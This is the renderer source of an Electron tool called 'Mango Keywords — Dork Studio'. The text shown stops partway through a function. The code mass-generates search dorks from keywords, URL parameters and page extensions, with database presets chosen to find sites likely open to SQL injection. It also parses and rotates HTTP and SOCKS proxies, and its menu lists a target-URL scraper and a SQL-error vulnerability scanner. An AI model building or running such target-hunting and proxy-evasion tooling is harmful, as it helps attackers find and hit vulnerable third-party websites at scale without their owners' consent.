/* Mango Keywords v3.5 — Dork Studio renderer */
let ipcRenderer = null;
try { ({ ipcRenderer } = require('electron')); } catch (e) { ipcRenderer = null; }
const axios = require('axios');
let HttpsProxyAgent = null, HttpProxyAgent = null, SocksProxyAgent = null;
try { ({ HttpsProxyAgent } = require('https-proxy-agent')); } catch (e) {}
try { ({ HttpProxyAgent } = require('http-proxy-agent')); } catch (e) {}
try {
  const m = require('socks-proxy-agent');
  SocksProxyAgent = m.SocksProxyAgent || m.default || m;
} catch (e) { SocksProxyAgent = null; }

/* ---------- helpers ---------- */
const $ = (id) => document.getElementById(id);
const esc = (s) => String(s).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
const tr = (s) => window.MangoI18n?.t ? window.MangoI18n.t(String(s)) : String(s);

function toast(msg, type = 'ok') {
  const box = $('toasts');
  const el = document.createElement('div');
  el.className = 'toast' + (type === 'error' ? ' error' : type === 'warn' ? ' warn' : '');
  el.textContent = msg;
  box.appendChild(el);
  setTimeout(() => { el.style.opacity = '0'; setTimeout(() => el.remove(), 300); }, 3200);
}

let logLines = 0;
function log(msg, cls = '') {
  const box = $('log');
  if (!box) return;
  const time = new Date().toLocaleTimeString('vi-VN', { hour12: false });
  const div = document.createElement('div');
  div.innerHTML = `<span class="t">[${time}]</span> <span class="${cls}">${esc(msg)}</span>`;
  box.appendChild(div);
  box.scrollTop = box.scrollHeight;
  logLines++;
  const c = $('log-count');
  if (c) c.textContent = logLines + ' dòng';
}
$('btn-clear-log')?.addEventListener('click', () => { $('log').innerHTML = ''; logLines = 0; $('log-count').textContent = '0 dòng'; });

async function openFile() {
  if (!ipcRenderer) {
    // fallback: hidden input
    return new Promise((resolve) => {
      const inp = document.createElement('input');
      inp.type = 'file'; inp.accept = '.txt,.csv,.list';
      inp.onchange = () => {
        const f = inp.files[0];
        if (!f) return resolve(null);
        const r = new FileReader();
        r.onload = () => resolve({ path: f.name, content: String(r.result || '') });
        r.readAsText(f);
      };
      inp.click();
    });
  }
  return await ipcRenderer.invoke('dialog:openFile');
}
async function saveFile(data, defaultName = 'output.txt') {
  if (!ipcRenderer) {
    const blob = new Blob([data], { type: 'text/plain' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = defaultName;
    a.click();
    return true;
  }
  return await ipcRenderer.invoke('dialog:saveFile', data, defaultName);
}

/* ---------- global state ---------- */
const S = {
  keywords: [], params: [], generated: [], checkerDorks: [], working: [], dead: [],
  scraperDorks: [], scraperUrls: [], uniqueUrls: new Set(), uniqueDomains: new Set(), stopScraper: false,
  proxies: [], // {id,type,host,port,user,pass,url,status,latency}
  proxyStats: { http: 0, socks4: 0, socks5: 0, invalid: 0, dup: 0 },
  stopChecker: false, stopProxyTest: false, checkerFilter: 'all',
  rrIndex: 0, stickyProxy: null,
};

/* ============================================================
   DORK THEO ĐUÔI TRANG + ƯU TIÊN CSDL
   - ext = đuôi file web: php, asp, aspx, jsp, do, cfm...
   - {pt} và {ext} là alias của nhau trong template
   ============================================================ */
const DB_EXT_DEFAULT = ['php', 'asp', 'aspx', 'jsp', 'do', 'cfm'];
const DB_PRESETS = {
  mysql:   { tpl: '{kw} {sf}.{pt}?{param}=', sf: 'inurl:', exts: ['php', 'php5'], db: 'mysql', note: 'MySQL/MariaDB — hay nằm ở .php?id=, .php5?cat= . Dùng kèm params id/cat/product_id.' },
  mssql:   { tpl: '{kw} {sf}.{pt}?{param}=', sf: 'inurl:', exts: ['asp', 'aspx', 'ashx'], db: 'mssql', note: 'MSSQL — hay nằm ở .asp?id= / .aspx?id= . Thêm từ khóa product/order/article.' },
  pgsql:   { tpl: '{kw} {sf}.{pt}?{param}=', sf: 'inurl:', exts: ['php', 'jsp', 'jspx'], db: 'pgsql', note: 'PostgreSQL — hay ở .php / .jsp . Thử params id, uid, pid, article_id.' },
  oracle:  { tpl: '{kw} {sf}.{pt}?{param}=', sf: 'inurl:', exts: ['jsp', 'jspx', 'do', 'action'], db: 'oracle', note: 'Oracle — hay ở .jsp / .do / .action . Kèm params id, sid, event_id.' },
  sqlite:  { tpl: '{kw} {sf}.{pt}?{param}=', sf: 'inurl:', exts: ['php', 'cgi', 'pl'], db: 'sqlite', note: 'SQLite — hay ở .php / .cgi nhỏ gọn. Dork hẹp, dễ dính error SQLite.' },
  general: { tpl: '{kw} {sf}.{pt}?{param}=', sf: 'inurl:', exts: ['php', 'php5', 'asp', 'aspx', 'jsp', 'do', 'action', 'cfm', 'cgi', 'pl'], db: 'general', note: 'General — quét hết đuôi dễ dính SQLi, combos sẽ phình to (kw × param × ext).' },
};

function getCheckedExtensions() {
  const cbs = [...document.querySelectorAll('.ext-cb')];
  if (!cbs.length) return [];
  return cbs.filter(c => c.checked).map(c => c.value.trim().toLowerCase()).filter(Boolean);
}
function getCustomExtensions() {
  const raw = ($('custom-ext-input')?.value || '').split(/[,;\s]+/).map(s => s.trim().toLowerCase().replace(/^\./, '')).filter(Boolean);
  return [...new Set(raw)];
}
function getSelectedExtensions() {
  const checked = getCheckedExtensions();
  const custom = getCustomExtensions();
  const merged = [...new Set([...checked, ...custom])];
  if (merged.length) return merged;
  // fallback: ô pt dự phòng
  const pt = ($('pt-input')?.value || 'php').trim().toLowerCase().replace(/^\./, '') || 'php';
  return [pt];
}
function setCheckedExtensions(list) {
  const set = new Set((list || []).map(s => String(s).toLowerCase()));
  document.querySelectorAll('.ext-cb').forEach(c => { c.checked = set.has(c.value.toLowerCase()); });
  updatePreview(); refreshStats();
}
function hasExtPlaceholder(tpl) {
  return /\{(pt|ext)\}/i.test(tpl || '');
}
function buildDorkFromTpl(tpl, kw, pr, ext, sf, xw, dom, v1, v2) {
  let d = tpl.split('{kw}').join(kw).split('{xw}').join(xw)
    .split('{param}').join(pr).split('{pr}').join(pr)
    .split('{sf}').join(sf).split('{pt}').join(ext).split('{ext}').join(ext)
    .split('{PT}').join(ext).split('{EXT}').join(ext)
    .split('{dom}').join(dom).split('{v1}').join(v1).split('{v2}').join(v2);
  d = d.replace(/\s+/g, ' ').trim();
  // nếu template không hề có chỗ chèn đuôi mà ext vẫn được chọn -> tự gắn inurl:.đuôi để đúng ý "tìm site url cụ thể"
  if (!hasExtPlaceholder(tpl) && ext) {
    // tương thích template cũ hardcode php: vd "{kw} inurl:php?id=" + ext=aspx -> đổi thành aspx thay vì gắn đuôi thừa
    // match cả ".php?id=" lẫn "php?id=" (template cũ không có dấu chấm)
    const hardExt = d.match(/\.?(php5?|asp[x]?|ashx|jsp[x]?|do|action|cfm|cgi|pl)(?=\?[a-z0-9_]*=)/i);
    if (hardExt) {
      if (hardExt[1].toLowerCase() !== ext.toLowerCase()) d = d.replace(hardExt[0], '.' + ext);
      else if (hardExt[0][0] !== '.') d = d.replace(hardExt[0], '.' + hardExt[1]); // chuẩn hoá thiếu chấm: php?id= -> .php?id=
      // đã có đúng đuôi (có chấm) thì giữ nguyên, không gắn thêm
    } else {
      const low = d.toLowerCase();
      if (!low.includes('.' + ext.toLowerCase())) d = (d + ` inurl:.${ext}`).replace(/\s+/g, ' ').trim();
    }
  }
  return d;
}

/* ============================================================
   PROXY PARSER — đa định dạng
   hỗ trợ:
   - ip:port
   - http://ip:port , https://.., socks4://.., socks5://.., socks5h://..
   - user:pass@ip:port (có hoặc không scheme)
   - scheme://user:pass@ip:port
   - ip:port:user:pass
   - user:pass:ip:port  (4 segment, segment cuối là port số)
   - ip:port|user|pass , ip:port;user;pass , ip,port,user,pass
   - user | pass | ip | port kiểu table? (cố gắng detect)
============================================================ */
function normalizeType(t) {
  t = String(t || '').toLowerCase().replace(/[^a-z0-9]/g, '');
  if (['http', 'https'].includes(t)) return 'http';
  if (['socks4', 'socks4a'].includes(t)) return 'socks4';
  if (['socks5', 'socks5h'].includes(t)) return 'socks5';
  return 'http';
}

function isValidHost(h) {
  if (!h || h.length > 255) return false;
  // ip v4
  if (/^\d{1,3}(\.\d{1,3}){3}$/.test(h)) {
    return h.split('.').every(o => { const n = parseInt(o, 10); return n >= 0 && n <= 255 && String(n) === String(parseInt(o, 10)) || (o.length > 1 && o[0] === '0' ? false : n >= 0 && n <= 255); });
  }
  // hostname
  if (/^[a-zA-Z0-9]([a-zA-Z0-9\-\.]{0,253}[a-zA-Z0-9])?$/.test(h) && h.includes('.')) return true;
  if (h === 'localhost') return true;
  return false;
}

function parseSingleProxy(rawLine, defaultType = 'auto') {
  let line = String(rawLine || '').trim();
  if (!line || line.startsWith('#') || line.startsWith('//')) return { ok: false, reason: 'comment/empty' };
  // bỏ khoảng trắng thừa quanh delimiters
  line = line.replace(/\s+/g, '');
  if (line.length < 7) return { ok: false, reason: 'too-short' };

  let scheme = null;
  let rest = line;
  const schemeMatch = line.match(/^([a-zA-Z][a-zA-Z0-9+\-.]*):\/\/(.*)$/);
  if (schemeMatch) {
    scheme = normalizeType(schemeMatch[1]);
    // nếu scheme lạ (vd: https Quang?) — nếu không thuộc http/socks thì coi như không có scheme? giữ http
    const known = ['http', 'https', 'socks4', 'socks4a', 'socks5', 'socks5h'];
    if (!known.includes(schemeMatch[1].toLowerCase())) {
      // có thể là user:pass dạng a://? hiếm — coi như không scheme
      scheme = null; rest = line;
    } else {
      rest = schemeMatch[2];
    }
  }

  let user = '', pass = '', host = '', port = '';

  // Case A: user:pass@host:port  (rest chứa @)
  if (rest.includes('@')) {
    const parts = rest.split('@');
    if (parts.length !== 2) return { ok: false, reason: 'bad-@' };
    const auth = parts[0], hp = parts[1];
    const au = auth.split(':');
    if (au.length < 2) return { ok: false, reason: 'bad-auth' };
    user = au[0]; pass = au.slice(1).join(':');
    const hpp = hp.split(':');
    if (hpp.length !== 2) return { ok: false, reason: 'bad-hostport' };
    host = hpp[0]; port = hpp[1];
  }
  // Case B: delimiters | ; ,
  else if (/[|;,]/.test(rest)) {
    const segs = rest.split(/[|;,]/).map(s => s.trim()).filter(Boolean);
    if (segs.length === 2 && segs[0].includes(':')) {
      // ip:port|user|pass thiếu? thực tế segs=3 mới đủ
      return { ok: false, reason: 'bad-sep' };
    }
    if (segs.length === 3) {
      // ip:port , user , pass
      const hp = segs[0].split(':');
      if (hp.length !== 2) return { ok: false, reason: 'bad-hp-sep' };
      host = hp[0]; port = hp[1]; user = segs[1]; pass = segs[2];
    } else if (segs.length === 4) {
      // ip, port, user, pass
      host = segs[0]; port = segs[1]; user = segs[2]; pass = segs[3];
    } else if (segs.length === 2) {
      // host:port , user:pass?
      const hp = segs[0].split(':');
      if (hp.length === 2) { host = hp[0]; port = hp[1]; const ap = segs[1].split(':'); user = ap[0]; pass = ap.slice(1).join(':'); }
      else return { ok: false, reason: 'bad-sep2' };
    } else return { ok: false, reason: 'bad-sep-n' };
  }
  // Case C: colon-separated 2,3,4 segments
  else {
    const segs = rest.split(':');
    if (segs.length === 2) { host = segs[0]; port = segs[1]; }
    else if (segs.length === 4) {
      // phân biệt ip:port:user:pass vs user:pass:ip:port
      // nếu segs[3] là số (port) và segs[1] không phải số -> user:pass:ip:port
      // nếu segs[1] là số -> ip:port:user:pass
      if (/^\d+$/.test(segs[1]) && !/^\d+$/.test(segs[3])) {
        // lạ — fallback ip:port:user:pass
        host = segs[0]; port = segs[1]; user = segs[2]; pass = segs[3];
      } else if (/^\d+$/.test(segs[3]) && !/^\d+$/.test(segs[1])) {
        user = segs[0]; pass = segs[1]; host = segs[2]; port = segs[3];
      } else if (/^\d+$/.test(segs[1])) {
        host = segs[0]; port = segs[1]; user = segs[2]; pass = segs[3];
      } else {
        return { ok: false, reason: 'bad-4seg' };
      }
    }
    else if (segs.length === 3) {
      // ip:port:user? thiếu pass — hoặc ip:port:pass? chuẩn là ip:port:user:pass (4). 3 seg thường là host:port:user (ít dùng) -> vẫn nhận, pass rỗng
      // nhưng cũng có thể user:pass:port? không host — loại
      // Quy ước: host:port:user:pass thiếu pass thì pass=''
      // nếu seg cuối không phải số và seg giữa là số -> host:port:user
      if (/^\d+$/.test(segs[1])) { host = segs[0]; port = segs[1]; user = segs[2]; pass = ''; }
      else return { ok: false, reason: 'bad-3seg' };
    }
    else return { ok: false, reason: 'bad-colons' };
  }

  host = (host || '').toLowerCase();
  port = String(port || '').trim();
  // strip path/query nếu user dán nhầm http://ip:port/path
  port = port.split(/[^0-9]/)[0];
  const portNum = parseInt(port, 10);
  if (!isValidHost(host)) return { ok: false, reason: 'bad-host' };
  if (!portNum || portNum < 1 || portNum > 65535) return { ok: false, reason: 'bad-port' };

  let type = scheme;
  if (!type || defaultType === 'http' || defaultType === 'socks4' || defaultType === 'socks5') {
    if (defaultType && defaultType !== 'auto') type = defaultType;
    if (!type) type = 'http';
  }
  if (type === 'https') type = 'http';
  type = normalizeType(type);

  const authPart = user ? `${encodeURIComponent(user)}:${encodeURIComponent(pass)}@` : '';
  const url = `${type}://${authPart}${host}:${portNum}`;
  const key = `${type}://${user ? user + ':' + pass + '@' : ''}${host}:${portNum}`.toLowerCase();
  return { ok: true, proxy: { type, host, port: portNum, user, pass, url, key } };
}

function parseProxyList(text, defaultType = 'auto') {
  const lines = String(text || '').split(/\r?\n/);
  const out = []; const seen = new Set();
  let invalid = 0, dup = 0;
  const cnt = { http: 0, socks4: 0, socks5: 0 };
  for (const ln of lines) {
    if (!ln.trim() || ln.trim().startsWith('#')) continue;
    const r = parseSingleProxy(ln, defaultType);
    if (!r.ok) { invalid++; continue; }
    if (seen.has(r.proxy.key)) { dup++; continue; }
    seen.add(r.proxy.key);
    r.proxy.id = out.length + 1;
    r.proxy.status = 'untested';
    r.proxy.latency = null;
    out.push(r.proxy);
    cnt[r.proxy.type] = (cnt[r.proxy.type] || 0) + 1;
  }
  return { proxies: out, invalid, dup, cnt };
}

function mergeProxies(newList) {
  const existing = new Set(S.proxies.map(p => p.key));
  let added = 0, dup = 0;
  for (const p of newList) {
    if (existing.has(p.key)) { dup++; continue; }
    existing.add(p.key);
    p.id = S.proxies.length + 1;
    S.proxies.push(p);
    added++;
  }
  return { added, dup };
}

function refreshProxyUI() {
  const total = S.proxies.length;
  const live = S.proxies.filter(p => p.status === 'live').length;
  const cnt = { http: 0, socks4: 0, socks5: 0 };
  S.proxies.forEach(p => { if (cnt[p.type] !== undefined) cnt[p.type]++; });
  S.proxyStats = { ...cnt, invalid: S.proxyStats.invalid || 0, dup: S.proxyStats.dup || 0 };

  $('stat-proxy').textContent = total;
  $('stat-proxy-sub').textContent = live + ' live';
  $('nav-proxy-count').textContent = total;
  $('sidebar-proxy-count').textContent = total + ' proxy';
  $('home-proxy').textContent = total;
  $('home-proxy-live').textContent = live;
  $('home-http').textContent = cnt.http;
  $('home-socks4').textContent = cnt.socks4;
  $('home-socks5').textContent = cnt.socks5;
  $('proxy-total-pill').textContent = total + ' proxy';
  $('proxy-list-count').textContent = total;
  $('proxy-live-text').textContent = 'Live: ' + live;
  $('proxy-dead-text').textContent = 'Dead: ' + S.proxies.filter(p => p.status === 'dead').length;

  const pct = total ? Math.round((live / total) * 100) : 0;
  $('donut').style.background = `conic-gradient(var(--green) ${pct}%, #223041 ${pct}%)`;
  $('donut-text').textContent = pct + '%';

  const dot = $('proxy-dot');
  dot.className = 'proxy-dot ' + (total === 0 ? 'none' : live > 0 ? 'good' : 'some');

  // mini trong checker
  const mini = $('proxy-mini');
  if (mini) {
    if (!total) mini.innerHTML = 'Chưa có proxy — sẽ chạy direct. <a data-goto="proxies">Mở Proxy Manager</a>';
    else mini.innerHTML = `Sẵn sàng <b>${total}</b> proxy (<b>${cnt.http}</b> HTTP • <b>${cnt.socks5}</b> S5 • <b>${cnt.socks4}</b> S4 • <b>${live}</b> live) — mode <b>${esc($('proxy-mode')?.value || 'auto')}</b>`;
  }
  renderProxyList();
  // system card
  $('sys-rotation').textContent = $('proxy-rotation')?.value || 'round-robin';
  $('sys-timeout').textContent = Math.round((parseInt($('checker-timeout')?.value || 8000) / 1000)) + 's';
  $('sys-threads').textContent = $('checker-threads')?.value || 10;
}

function renderProxyList() {
  const box = $('proxy-list');
  if (!box) return;
  const q = ($('proxy-search')?.value || '').toLowerCase();
  const list = S.proxies.filter(p => !q || (p.host + ':' + p.port).includes(q) || p.type.includes(q));
  if (!list.length) { box.innerHTML = '<div class="empty">Không khớp / chưa có proxy.</div>'; return; }
  box.innerHTML = list.slice(0, 500).map(p => {
    const st = p.status === 'live' ? '<span class="tag live">LIVE ' + (p.latency ?? '') + 'ms</span>'
      : p.status === 'dead' ? '<span class="tag dead">DEAD</span>' : '<span class="tag">UNTESTED</span>';
    return `<div class="ritem"><span class="tag ${p.type}">${p.type.toUpperCase()}</span><span class="url">${esc(p.user ? p.user + ':***@' : '')}${esc(p.host)}:${p.port}</span>${st}<button data-del="${p.key}" style="background:none;border:0;color:#ff8a8a;cursor:pointer">✕</button></div>`;
  }).join('') + (list.length > 500 ? `<div class="empty">…và ${list.length - 500} proxy nữa</div>` : '');
  box.querySelectorAll('[data-del]').forEach(b => b.addEventListener('click', () => {
    S.proxies = S.proxies.filter(p => p.key !== b.getAttribute('data-del'));
    refreshProxyUI();
  }));
}

/* ---------- proxy agent factory ---------- */
function agentFor(proxy, timeout) {
  const target = proxy.url;
  try {
    if (proxy.type === 'socks4' || proxy.type === 'socks5') {
      if (!SocksProxyAgent) { log('Thiếu gói socks-proxy-agent — npm install để dùng SOCKS', 'err'); return {}; }
      const a = new SocksProxyAgent(target, { timeout });
      return { httpAgent: a, httpsAgent: a };
    }
    // http/https
    if (HttpsProxyAgent) {
      const a = new HttpsProxyAgent(target, { timeout });
      const out = { httpsAgent: a };
      if (HttpProxyAgent) out.httpAgent = new HttpProxyAgent(target, { timeout });
      else out.httpAgent = a;
      return out;
    }
  } catch (e) { log('Tạo agent lỗi: ' + e.message, 'err'); }
  return {};
}

function pickProxy() {
  const mode = $('proxy-mode')?.value || 'auto';
  if (mode === 'noproxy') return null;
  let pool = S.proxies;
  if (mode !== 'auto') pool = pool.filter(p => p.type === mode);
  // ưu tiên live nếu đã test
  const live = pool.filter(p => p.status === 'live');
  if (live.length) pool = live;
  if (!pool.length) return null;
  const rot = $('proxy-rotation')?.value || 'round-robin';
  if (rot === 'random') return pool[Math.floor(Math.random() * pool.length)];
  if (rot === 'sticky') {
    if (!S.stickyProxy || !pool.find(p => p.key === S.stickyProxy.key) || S.stickyProxy.status === 'dead') {
      S.stickyProxy = pool[Math.floor(Math.random() * pool.length)];
    }
    return S.stickyProxy;
  }
  const p = pool[S.rrIndex % pool.length];
  S.rrIndex++;
  return p;
}

/* ---------- navigation ---------- */
const TITLES = {
  home: ['Dashboard', 'Tổng quan nhanh toàn bộ workflow'],
  maker: ['Dork Maker', 'Gen hàng loạt dork từ keywords × params'],
  checker: ['Dork Checker', 'Check live qua proxy đa luồng'],
  scraper: ['Search Scraper', 'Thu thập URL mục tiêu từ search engines'],
  parser: ['Dork Parser', 'Tách tham số từ URL'],
  scanner: ['Vuln Scanner', 'Probe nhẹ phát hiện lỗi SQL'],
  proxies: ['Proxy Manager', 'Import HTTP / SOCKS4 / SOCKS5 đa định dạng'],
  utils: ['Utilities', 'Làm sạch list & công cụ phụ'],
};
function goto(view) {
  document.querySelectorAll('.nav-btn').forEach(b => b.classList.toggle('active', b.dataset.target === view));
  document.querySelectorAll('.top-nav .tab').forEach(t => t.classList.toggle('active', t.dataset.goto === view));
  document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
  $('view-' + view)?.classList.add('active');
  if (TITLES[view]) { $('page-title').textContent = TITLES[view][0]; $('page-sub').textContent = TITLES[view][1]; }
}
document.querySelectorAll('.nav-btn').forEach(b => b.addEventListener('click', () => goto(b.dataset.target)));
document.querySelectorAll('[data-goto]').forEach(b => b.addEventListener('click', () => goto(b.getAttribute('data-goto'))));
$('btn-goto-checker')?.addEventListener('click', () => goto('checker'));

/* ---------- stats ---------- */
function refreshStats() {
  const extN = getSelectedExtensions().length || 1;
  const combos = S.keywords.length * S.params.length * extN;
  $('stat-kw').textContent = S.keywords.length;
  $('stat-pr').textContent = S.params.length;
  $('stat-combo').textContent = combos.toLocaleString();
  $('stat-gen').textContent = S.generated.length;
  $('home-kw').textContent = S.keywords.length;
  $('home-pr').textContent = S.params.length;
  $('home-gen').textContent = S.generated.length;
  $('home-working').textContent = S.working.length;
  $('combo-pill').textContent = combos.toLocaleString() + ' combos (×' + extN + ' đuôi)';
  $('use-gen-status').textContent = S.generated.length;
  $('nav-maker-count').textContent = S.generated.length ? S.generated.length : '';
  $('nav-checker-count').textContent = S.working.length ? S.working.length : '';
  if ($('nav-scraper-count')) $('nav-scraper-count').textContent = S.scraperUrls.length ? S.scraperUrls.length : '';
  updatePreview();
}
function updatePreview() {
  const tpl = $('tpl-input')?.value || '{kw} {sf}.{pt}?{param}=';
  const sf = $('sf-input')?.value || '';
  const exts = getSelectedExtensions();
  const ext = exts[0] || ($('pt-input')?.value || 'php');
  const built = buildDorkFromTpl(tpl, S.keywords[0] || '<kw>', S.params[0] || '<param>', ext, sf || '<sf>', $('xw-input')?.value || '', $('dom-input')?.value || '', $('v1-input')?.value || '', $('v2-input')?.value || '');
  $('maker-preview').textContent = built + (exts.length > 1 ? `  (+${exts.length - 1} đuôi nữa: ${exts.slice(1, 4).join(', ')}${exts.length > 4 ? '…' : ''})` : '');
}
['tpl-input', 'sf-input', 'v1-input', 'v2-input', 'xw-input', 'pt-input', 'dom-input', 'custom-ext-input'].forEach(id => $(id)?.addEventListener('input', () => { refreshStats(); }));
document.querySelectorAll('.tpl-vars button').forEach(b => b.addEventListener('click', () => {
  const inp = $('tpl-input'); inp.value += ' ' + b.getAttribute('data-ins'); updatePreview(); inp.focus();
}));

/* ---------- MAKER ---------- */
function parseLines(t) { return String(t || '').split(/\r?\n/).map(s => s.trim()).filter(Boolean); }
$('btn-import-kw')?.addEventListener('click', async () => {
  const f = await openFile(); if (!f) return;
  S.keywords = [...new Set(parseLines(f.content))];
  $('kw-status').textContent = S.keywords.length + ' dòng';
  log(`Nạp ${S.keywords.length} keywords từ ${f.path}`, 'ok'); refreshStats(); toast(`Đã nạp ${S.keywords.length} keywords`);
});
$('btn-import-param')?.addEventListener('click', async () => {
  const f = await openFile(); if (!f) return;
  S.params = [...new Set(parseLines(f.content))];
  $('param-status').textContent = S.params.length + ' dòng';
  log(`Nạp ${S.params.length} params`, 'ok'); refreshStats(); toast(`Đã nạp ${S.params.length} parameters`);
});
$('btn-import-kw-clip')?.addEventListener('click', async () => {
  try {
    const t = await navigator.clipboard.readText();
    const arr = [...new Set(parseLines(t))];
    if (!arr.length) return toast('Clipboard trống', 'warn');
    S.keywords = arr; $('kw-status').textContent = arr.length + ' dòng';
    refreshStats(); toast(`Đã dán ${arr.length} keywords`);
  } catch { toast('Không đọc được clipboard — cấp quyền clipboard', 'error'); }
});
$('btn-load-default-param')?.addEventListener('click', async () => {
  try {
    const res = await fetch('../web_parameters.txt');
    if (!res.ok) throw new Error('not found');
    const t = await res.text();
    S.params = [...new Set(parseLines(t))];
  } catch {
    try {
      const res2 = await fetch('./web_parameters.txt');
      if (res2.ok) { S.params = [...new Set(parseLines(await res2.text()))]; }
      else throw new Error('no file');
    } catch { S.params = ['id', 'q', 's', 'search', 'query', 'page', 'cat', 'product_id', 'article_id', 'user_id']; }
  }
  $('param-status').textContent = S.params.length + ' dòng';
  refreshStats(); log(`Nạp params mẫu: ${S.params.length}`, 'ok'); toast(`Params mẫu: ${S.params.length}`);
});
$('btn-load-db-param')?.addEventListener('click', async () => {
  const DB_FALLBACK = ['id','cat','catid','pid','product_id','article_id','news_id','post_id','order_id','user_id','uid','item_id','page','view','detail','type','sort','action','content_id','event_id','transaction_id','payment_id','file_id','doc_id','did','nid','cid','aid','year','num','pageno'];
  try {
    let t = null;
    for (const p of ['./db_params.txt', '../db_params.txt', './mango-keywords-node/db_params.txt']) {
      try { const r = await fetch(p); if (r.ok) { t = await r.text(); break; } } catch {}
    }
    if (!t) throw new Error('not found');
    S.params = [...new Set(parseLines(t).filter(x => !x.startsWith('#')))];
  } catch { S.params = DB_FALLBACK; }
  $('param-status').textContent = S.params.length + ' dòng (DB)';
  refreshStats(); log(`Nạp params DB ưu tiên SQLi: ${S.params.length}`, 'ok'); toast(`Params DB: ${S.params.length} — chuyên id/cat/product/...`);
});
$('btn-load-db-ext')?.addEventListener('click', async () => {
  // ưu tiên đọc file sqli_extensions.txt, fallback dùng DB_EXT_DEFAULT
  try {
    let t = null;
    for (const p of ['./sqli_extensions.txt', '../sqli_extensions.txt']) {
      try { const r = await fetch(p); if (r.ok) { t = await r.text(); break; } } catch {}
    }
    if (t) {
      const list = [...new Set(t.split(/\r?\n/).map(s => s.trim().toLowerCase().replace(/^\./, '')).filter(s => s && !s.startsWith('#')))];
      if (list.length) setCheckedExtensions(list);
      else setCheckedExtensions(DB_EXT_DEFAULT);
      log(`Nạp ext từ file: ${list.join(',')}`, 'ok');
    } else setCheckedExtensions(DB_EXT_DEFAULT);
  } catch { setCheckedExtensions(DB_EXT_DEFAULT); }
  toast('Đã tick ext ưu tiên DB: ' + getSelectedExtensions().map(e => '.' + e).join(' '));
});
$('btn-max')?.addEventListener('click', () => {
  const extN = getSelectedExtensions().length || 1;
  const c = S.keywords.length * S.params.length * extN;
  $('gen-amount').value = c || 15000;
  toast(`MAX = kw(${S.keywords.length}) × pr(${S.params.length}) × ext(${extN}) = ${c}`);
});
// preset + ext buttons
document.querySelectorAll('.ext-cb').forEach(c => c.addEventListener('change', refreshStats));
$('btn-ext-all')?.addEventListener('click', () => { document.querySelectorAll('.ext-cb').forEach(c => c.checked = true); refreshStats(); });
$('btn-ext-clear')?.addEventListener('click', () => { document.querySelectorAll('.ext-cb').forEach(c => c.checked = false); $('custom-ext-input').value = ''; refreshStats(); toast('Đã bỏ tick hết — sẽ dùng pt dự phòng', 'warn'); });
$('btn-ext-dbs')?.addEventListener('click', () => { setCheckedExtensions(DB_EXT_DEFAULT); toast('Đã tick đuôi ưu tiên DB: ' + DB_EXT_DEFAULT.join(', ')); });
$('sf-preset')?.addEventListener('change', (e) => {
  const v = e.target.value;
  if (!v) return;
  if (v === 'site:') { $('sf-input').value = 'site:example.com inurl:'; }
  else $('sf-input').value = v;
  updatePreview();
});
$('db-engine')?.addEventListener('change', (e) => {
  const v = e.target.value;
  const sc = $('scanner-db');
  if (sc && v !== 'general') sc.value = v;
  log('DB ưu tiên → ' + v + ' (đồng bộ sang Scanner)', 'info');
});
document.querySelectorAll('.preset-row .preset').forEach(b => b.addEventListener('click', () => {
  const key = b.getAttribute('data-preset');
  const p = DB_PRESETS[key];
  if (!p) return;
  document.querySelectorAll('.preset-row .preset').forEach(x => x.classList.remove('active'));
  b.classList.add('active');
  $('tpl-input').value = p.tpl;
  $('sf-input').value = p.sf;
  setCheckedExtensions(p.exts);
  if ($('db-engine')) $('db-engine').value = p.db;
  if ($('scanner-db') && p.db !== 'general') $('scanner-db').value = p.db;
  if ($('preset-note')) $('preset-note').textContent = p.note;
  log(`Preset [${key}]: tpl=${p.tpl} sf=${p.sf} ext=${p.exts.join(',')} db=${p.db}`, 'ok');
  toast(`Preset ${key.toUpperCase()}: ${p.exts.map(e => '.' + e).join(' ')}`);
  refreshStats();
}));
$('btn-start')?.addEventListener('click', async () => {
  if (!S.keywords.length || !S.params.length) { toast('Hãy import keywords + parameters trước', 'error'); log('Thiếu keywords/params', 'err'); return; }
  const tpl = $('tpl-input').value || '{kw} {sf}.{pt}?{param}=';
  const sf = $('sf-input').value.trim(), v1 = $('v1-input').value.trim(), v2 = $('v2-input').value.trim();
  const xw = $('xw-input').value.trim(), dom = $('dom-input').value.trim();
  const exts = getSelectedExtensions();
  const limit = parseInt($('gen-amount').value) || 15000;
  const order = document.querySelector('input[name="order"]:checked')?.value || 'random';
  const dedupe = $('chk-dedupe').checked;
  $('run-status').textContent = 'Running…'; $('run-status').classList.add('running');
  $('btn-start').disabled = true;
  log(`Bắt đầu gen — tpl: ${tpl} | ext: ${exts.join(',')} | limit ${limit} | ${order}`, 'info');
  const seen = new Set(); const out = [];
  const totalCombos = S.keywords.length * S.params.length * exts.length;
  const target = Math.min(limit, totalCombos);
  // build triples [kw, pr, ext]
  let pairs = [];
  const CHUNK_LOG = 2000;
  if (order === 'sequential') {
    outer: for (const kw of S.keywords) for (const pr of S.params) for (const ext of exts) {
      pairs.push([kw, pr, ext]); if (pairs.length >= target) break outer;
    }
  } else {
    // random sampling không trùng trên 3 chiều kw × pr × ext
    const kws = [...S.keywords].sort(() => Math.random() - .5);
    const prs = [...S.params].sort(() => Math.random() - .5);
    const used = new Set();
    let guard = 0;
    while (pairs.length < target && guard < target * 6 + 1000) {
      guard++;
      const kw = kws[Math.floor(Math.random() * kws.length)];
      const pr = prs[Math.floor(Math.random() * prs.length)];
      const ext = exts[Math.floor(Math.random() * exts.length)];
      const k = kw + ' ' + pr + ' ' + ext;
      if (used.has(k)) continue;
      used.add(k); pairs.push([kw, pr, ext]);
      if (pairs.length % CHUNK_LOG === 0) { $('progress-text').textContent = `Sampling: ${pairs.length}/${target}`; $('maker-bar').style.width = Math.round(pairs.length / target * 60) + '%'; await new Promise(r => setTimeout(r, 0)); }
    }
  }
  for (let i = 0; i < pairs.length; i++) {
    const [kw, pr, ext] = pairs[i];
    let d = buildDorkFromTpl(tpl, kw, pr, ext, sf, xw, dom, v1, v2);
    d = d.replace(/\s+/g, ' ').trim();
    if (dedupe) { if (seen.has(d)) continue; seen.add(d); }
    out.push(d);
    if (i % CHUNK_LOG === 0) { $('maker-bar').style.width = (60 + Math.round(i / pairs.length * 40)) + '%'; $('progress-text').textContent = `Generated: ${out.length}`; await new Promise(r => setTimeout(r, 0)); }
  }
  S.generated = out;
  $('maker-bar').style.width = '100%';
